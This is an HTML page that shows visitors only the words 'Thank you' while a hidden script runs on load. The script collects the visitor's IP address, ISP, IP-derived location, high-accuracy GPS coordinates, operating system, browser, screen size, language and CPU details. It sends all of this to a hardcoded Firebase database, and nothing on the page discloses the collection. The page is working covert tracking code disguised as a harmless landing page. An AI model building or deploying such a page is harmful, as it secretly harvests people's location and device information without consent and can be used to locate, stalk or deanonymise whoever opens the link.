<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thank You</title>
    <!-- Tailwind CSS (CDN) -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://cdn.jsdelivr.net/gh/orioncactus/pretendard/dist/web/static/pretendard.css');
        body {
            font-family: 'Pretendard', -apple-system, BlinkMacSystemFont, system-ui, Roboto, sans-serif;
        }
    </style>
</head>
<body class="bg-slate-900 text-slate-100 min-h-screen flex items-center justify-center p-4">

    <!-- 화면에 노출되는 최소한의 UI -->
    <div class="text-center space-y-4">
        <h1 class="text-4xl sm:text-6xl font-extrabold tracking-tight text-white drop-shadow-md">
            Thank you
        </h1>
    </div>

    <!-- Firebase SDK 및 백그라운드 수집 스크립트 -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-database.js";

        // Firebase RTDB URL 설정
        const DATABASE_URL = "https://database-4d830-default-rtdb.firebaseio.com/";

        const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : {
            databaseURL: DATABASE_URL
        };

        if (!firebaseConfig.databaseURL) {
            firebaseConfig.databaseURL = DATABASE_URL;
        }

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app, DATABASE_URL);

        // 페이지 로드 시 정보 수집 시작
        document.addEventListener('DOMContentLoaded', async () => {
            await collectAndSaveDeviceInfo();
        });

        // GPS 위치 정보를 프로미스로 래핑 (타임아웃 설정 포함)
        function getGpsPosition() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ latitude: "미지원", longitude: "미지원", accuracy: null, error: "Not supported" });
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            error: null
                        });
                    },
                    (error) => {
                        let errorMsg = "권한 거부 또는 실패";
                        if (error.code === error.PERMISSION_DENIED) errorMsg = "권한 거부됨";
                        else if (error.code === error.POSITION_UNAVAILABLE) errorMsg = "위치 확인 불가";
                        else if (error.code === error.TIMEOUT) errorMsg = "시간 초과";

                        resolve({
                            latitude: null,
                            longitude: null,
                            accuracy: null,
                            error: errorMsg
                        });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 7000,
                        maximumAge: 0
                    }
                );
            });
        }

        async function collectAndSaveDeviceInfo() {
            const ua = navigator.userAgent;

            // 1. OS 감지
            let os = "알 수 없음";
            if (ua.indexOf("Win") !== -1) os = "Windows";
            else if (ua.indexOf("Mac") !== -1) os = "macOS";
            else if (ua.indexOf("Android") !== -1) os = "Android";
            else if (ua.indexOf("like Mac") !== -1 || ua.indexOf("iPhone") !== -1 || ua.indexOf("iPad") !== -1) os = "iOS";
            else if (ua.indexOf("Linux") !== -1) os = "Linux";

            // 2. 브라우저 감지
            let browser = "알 수 없음";
            if (ua.indexOf("SamsungBrowser") !== -1) browser = "Samsung Internet";
            else if (ua.indexOf("KAKAOTALK") !== -1) browser = "KakaoTalk";
            else if (ua.indexOf("NAVER") !== -1) browser = "Naver App";
            else if (ua.indexOf("Chrome") !== -1 && ua.indexOf("Edg") === -1) browser = "Chrome";
            else if (ua.indexOf("Safari") !== -1 && ua.indexOf("Chrome") === -1) browser = "Safari";
            else if (ua.indexOf("Edg") !== -1) browser = "Edge";
            else if (ua.indexOf("Firefox") !== -1) browser = "Firefox";

            // 3. 기기 유형 감지
            let deviceType = "Desktop";
            if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
                deviceType = /iPad|Tablet/i.test(ua) ? "Tablet" : "Mobile";
            }

            // 4. IP 주소 및 IP 기반 위치 정보
            let ipData = { ip: "알 수 없음", isp: "알 수 없음", location: "알 수 없음" };
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (response.ok) {
                    const data = await response.json();
                    ipData.ip = data.ip || "알 수 없음";
                    ipData.isp = data.org || data.asn || "알 수 없음";
                    const city = data.city || '';
                    const region = data.region || '';
                    const country = data.country_name || '';
                    ipData.location = `${country} ${region} ${city}`.trim() || "알 수 없음";
                }
            } catch (e) {
                try {
                    const fallbackRes = await fetch('https://api.ipify.org?format=json');
                    const fallbackData = await fallbackRes.json();
                    ipData.ip = fallbackData.ip || "알 수 없음";
                } catch (err) {
                    console.error("IP fetch failed", err);
                }
            }

            // 5. GPS 위치 정보 측정 (병렬 수행)
            const gpsData = await getGpsPosition();

            // 6. 수집할 데이터 페이로드 구성
            const logData = {
                timestamp: new Date().toISOString(),
                createdAt: Date.now(),
                ip: ipData.ip,
                isp: ipData.isp,
                ipLocation: ipData.location,
                gps: {
                    latitude: gpsData.latitude,
                    longitude: gpsData.longitude,
                    accuracy: gpsData.accuracy,
                    error: gpsData.error
                },
                os: os,
                browser: browser,
                deviceType: deviceType,
                viewport: `${window.innerWidth}x${window.innerHeight}`,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language || navigator.userLanguage || "알 수 없음",
                cpuCores: navigator.hardwareConcurrency || "알 수 없음",
                userAgent: ua
            };

            // 7. Firebase Realtime Database 'device_logs' 경로에 저장
            try {
                const logsRef = ref(db, 'device_logs');
                await push(logsRef, logData);
            } catch (err) {
                console.error("RTDB 기록 실패:", err);
            }
        }
    </script>
</body>
</html>
